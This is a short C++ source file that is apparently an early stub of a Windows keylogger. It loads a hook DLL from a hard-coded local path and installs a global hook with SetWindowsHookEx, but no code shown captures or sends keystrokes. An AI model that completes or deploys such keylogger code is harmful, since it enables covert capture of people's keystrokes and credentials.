// KeyLogger.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <windows.h>
#include <iostream>

void logKey();

int _tmain(int argc, _TCHAR* argv[])
{
	logKey();
	return 0;
}

void logKey() {
	//while (true) {
		HOOKPROC hkprcSysMsg;
		static HINSTANCE hinstDLL;
		static HHOOK hhookSysMsg;

		hinstDLL = LoadLibrary(TEXT("C:\\Users\\Kodie Glosser\\Documents\\GitHub\\Keylogger\\HookDll\\Debug\\HookDll.dll"));
		hkprcSysMsg = (HOOKPROC)GetProcAddress(hinstDLL, "SysMessageProc");

		hhookSysMsg = SetWindowsHookEx(WH_SYSMSGFILTER, hkprcSysMsg, hinstDLL, 0);
		int i;
		std::cout << hhookSysMsg << std::endl;
		std::cin >> i;
	//}
}
